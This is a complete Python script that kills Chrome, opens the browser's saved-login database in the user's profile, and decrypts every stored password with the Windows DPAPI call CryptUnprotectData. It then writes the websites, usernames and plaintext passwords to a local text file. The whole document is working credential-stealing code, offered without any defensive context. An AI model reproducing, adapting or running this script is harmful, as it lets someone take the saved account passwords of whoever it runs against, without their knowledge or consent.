import os
import sqlite3
import win32crypt
import psutil
import time

def stopChrome():
	for proc in psutil.process_iter():
	    proc_name = proc.name()
	    if proc_name == 'chrome.exe':
	        os.system("taskkill /im chrome.exe /f")
	    else:
	        pass

def main():
	time.sleep(10)
	data = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	try:
		stopChrome()

		connection = sqlite3.connect(data, timeout=10)
		print ("[>]Connected to data base..")
		cursor = connection.cursor()
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		final_data=cursor.fetchall()

		print ("[>]Found "+str(len(final_data))+" password..")

		with open("chrome.txt","w") as file:
			file.write("Extracted chrome passwords :\n\n")

			for website_data in final_data:
			    password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
			    one="Website  : "+str(website_data[0])
			    two="Username : "+str(website_data[1])
			    three="Password : "+str(password).split("'")[1]
			    file.write(one+"\n"+two+"\n"+three)
			    file.write("\n\n"+" == ==="*10+"\n\n")

		print ("[>]Decrypted "+str(len(final_data))+" passwords..")
		print ("[>]Data written to chrome.txt")

	except Exception as e:
		raise e
	finally:
		 connection.close()


if __name__ == '__main__':
	main()



